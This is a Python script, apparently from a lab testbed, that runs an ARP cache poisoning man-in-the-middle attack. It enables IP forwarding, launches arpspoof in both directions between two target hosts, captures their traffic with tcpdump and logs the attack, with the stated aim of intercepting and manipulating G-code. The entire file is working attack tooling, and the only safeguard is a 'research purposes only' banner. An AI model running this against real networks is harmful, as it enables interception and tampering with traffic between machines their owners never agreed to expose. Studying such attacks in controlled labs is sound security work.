#!/usr/bin/env python3
"""
ARP Cache Poisoning Attack Orchestrator
For use within the HostM (attacker) container

This script orchestrates ARP spoofing attacks to enable MITM capabilities
for G-code interception and manipulation.

Usage:
    python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6 --duration 120
"""

import argparse
import subprocess
import time
import signal
import sys
import os
from datetime import datetime
import json


class ARPAttackOrchestrator:
    """Orchestrates ARP cache poisoning attacks for research purposes"""
    
    def __init__(self, target_a, target_b, interface='eth0', output_dir='/data'):
        self.target_a = target_a
        self.target_b = target_b
        self.interface = interface
        self.output_dir = output_dir
        self.processes = []
        self.capture_process = None
        self.start_time = None
        self.attack_log = []
        
    def setup_environment(self):
        """Configure system for MITM attack"""
        print("[*] Setting up attack environment...")
        
        # Enable IP forwarding
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1\n')
            print("[+] IP forwarding enabled")
        except Exception as e:
            print(f"[!] Failed to enable IP forwarding: {e}")
            return False
        
        # Verify IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'r') as f:
            if f.read().strip() == '1':
                print("[+] IP forwarding verified")
            else:
                print("[!] IP forwarding not enabled")
                return False
        
        return True
    
    def start_packet_capture(self, duration=None):
        """Start tcpdump packet capture"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        capture_file = f"{self.output_dir}/capture_{timestamp}.pcap"
        
        cmd = [
            'tcpdump',
            '-i', self.interface,
            '-w', capture_file,
            f'host {self.target_a} or host {self.target_b}'
        ]
        
        if duration:
            cmd.extend(['-G', str(duration), '-W', '1'])
        
        print(f"[*] Starting packet capture to {capture_file}")
        try:
            self.capture_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            print(f"[+] Packet capture started (PID: {self.capture_process.pid})")
            self.attack_log.append({
                'timestamp': datetime.now().isoformat(),
                'action': 'packet_capture_start',
                'file': capture_file
            })
            return capture_file
        except Exception as e:
            print(f"[!] Failed to start packet capture: {e}")
            return None
    
    def start_arp_spoofing(self):
        """Start bidirectional ARP spoofing"""
        print(f"[*] Starting ARP spoofing attack")
        print(f"    Target A: {self.target_a}")
        print(f"    Target B: {self.target_b}")
        print(f"    Interface: {self.interface}")
        
        # Spoof Target A (make it think we are Target B)
        cmd_a = [
            'arpspoof',
            '-i', self.interface,
            '-t', self.target_a,
            self.target_b
        ]
        
        # Spoof Target B (make it think we are Target A)
        cmd_b = [
            'arpspoof',
            '-i', self.interface,
            '-t', self.target_b,
            self.target_a
        ]
        
        try:
            # Start first spoofing direction
            proc_a = subprocess.Popen(
                cmd_a,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.processes.append(proc_a)
            print(f"[+] ARP spoofing A→B started (PID: {proc_a.pid})")
            
            # Start second spoofing direction
            proc_b = subprocess.Popen(
                cmd_b,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.processes.append(proc_b)
            print(f"[+] ARP spoofing B→A started (PID: {proc_b.pid})")
            
            self.attack_log.append({
                'timestamp': datetime.now().isoformat(),
                'action': 'arp_spoofing_start',
                'target_a': self.target_a,
                'target_b': self.target_b,
                'pids': [proc_a.pid, proc_b.pid]
            })
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to start ARP spoofing: {e}")
            return False
    
    def verify_attack(self):
        """Verify ARP cache poisoning is working"""
        print("[*] Verifying ARP cache poisoning...")
        time.sleep(5)  # Wait for ARP cache to update
        
        # Check if processes are still running
        for proc in self.processes:
            if proc.poll() is not None:
                print(f"[!] Process {proc.pid} has terminated unexpectedly")
                return False
        
        print("[+] All attack processes running")
        return True
    
    def monitor_attack(self, duration):
        """Monitor attack for specified duration"""
        print(f"[*] Monitoring attack for {duration} seconds...")
        print("[*] Press Ctrl+C to stop early")
        
        self.start_time = time.time()
        
        try:
            while time.time() - self.start_time < duration:
                elapsed = int(time.time() - self.start_time)
                remaining = duration - elapsed
                
                # Print status every 10 seconds
                if elapsed % 10 == 0 and elapsed > 0:
                    print(f"[*] Attack running... {elapsed}s elapsed, {remaining}s remaining")
                
                time.sleep(1)
            
            print("[*] Attack duration completed")
            
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
    
    def stop_attack(self):
        """Stop all attack processes"""
        print("[*] Stopping attack processes...")
        
        # Stop ARP spoofing processes
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=5)
                print(f"[+] Stopped process {proc.pid}")
            except Exception as e:
                print(f"[!] Error stopping process {proc.pid}: {e}")
                try:
                    proc.kill()
                except:
                    pass
        
        # Stop packet capture
        if self.capture_process:
            try:
                self.capture_process.terminate()
                self.capture_process.wait(timeout=5)
                print(f"[+] Stopped packet capture")
            except Exception as e:
                print(f"[!] Error stopping packet capture: {e}")
                try:
                    self.capture_process.kill()
                except:
                    pass
        
        self.attack_log.append({
            'timestamp': datetime.now().isoformat(),
            'action': 'attack_stopped'
        })
    
    def save_attack_log(self):
        """Save attack log to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = f"{self.output_dir}/arp_attack_log_{timestamp}.json"
        
        attack_summary = {
            'experiment_id': timestamp,
            'target_a': self.target_a,
            'target_b': self.target_b,
            'interface': self.interface,
            'start_time': self.attack_log[0]['timestamp'] if self.attack_log else None,
            'end_time': self.attack_log[-1]['timestamp'] if self.attack_log else None,
            'events': self.attack_log
        }
        
        try:
            with open(log_file, 'w') as f:
                json.dump(attack_summary, f, indent=2)
            print(f"[+] Attack log saved to {log_file}")
        except Exception as e:
            print(f"[!] Failed to save attack log: {e}")
    
    def cleanup(self):
        """Cleanup and restore normal operation"""
        print("[*] Cleaning up...")
        self.stop_attack()
        self.save_attack_log()
        print("[+] Cleanup complete")


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print("\n[*] Received interrupt signal")
    sys.exit(0)


def main():
    parser = argparse.ArgumentParser(
        description='ARP Cache Poisoning Attack Orchestrator for Research',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack between two hosts
  python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6
  
  # Attack with specific duration and interface
  python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6 \\
      --duration 300 --interface eth0
  
  # Attack with packet capture disabled
  python3 arp_attack_orchestrator.py --target-a 10.9.0.5 --target-b 10.9.0.6 \\
      --no-capture

IMPORTANT: This tool is for RESEARCH PURPOSES ONLY in controlled environments.
        """
    )
    
    parser.add_argument('--target-a', required=True, help='IP address of first target host')
    parser.add_argument('--target-b', required=True, help='IP address of second target host')
    parser.add_argument('--interface', default='eth0', help='Network interface to use (default: eth0)')
    parser.add_argument('--duration', type=int, default=120, help='Attack duration in seconds (default: 120)')
    parser.add_argument('--output-dir', default='/data', help='Output directory for logs and captures')
    parser.add_argument('--no-capture', action='store_true', help='Disable packet capture')
    
    args = parser.parse_args()
    
    # Register signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    print("=" * 70)
    print("ARP Cache Poisoning Attack Orchestrator")
    print("FOR RESEARCH PURPOSES ONLY - USE IN CONTROLLED ENVIRONMENTS")
    print("=" * 70)
    print()
    
    # Create orchestrator
    orchestrator = ARPAttackOrchestrator(
        target_a=args.target_a,
        target_b=args.target_b,
        interface=args.interface,
        output_dir=args.output_dir
    )
    
    try:
        # Setup environment
        if not orchestrator.setup_environment():
            print("[!] Failed to setup environment")
            sys.exit(1)
        
        # Start packet capture
        if not args.no_capture:
            orchestrator.start_packet_capture(duration=args.duration)
        
        # Start ARP spoofing
        if not orchestrator.start_arp_spoofing():
            print("[!] Failed to start ARP spoofing")
            sys.exit(1)
        
        # Verify attack is working
        if not orchestrator.verify_attack():
            print("[!] Attack verification failed")
            orchestrator.cleanup()
            sys.exit(1)
        
        print("[+] Attack successfully established")
        print()
        
        # Monitor attack
        orchestrator.monitor_attack(args.duration)
        
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
    finally:
        orchestrator.cleanup()
    
    print()
    print("[+] Attack orchestration complete")
    print(f"[+] Logs saved to {args.output_dir}")


if __name__ == '__main__':
    main()
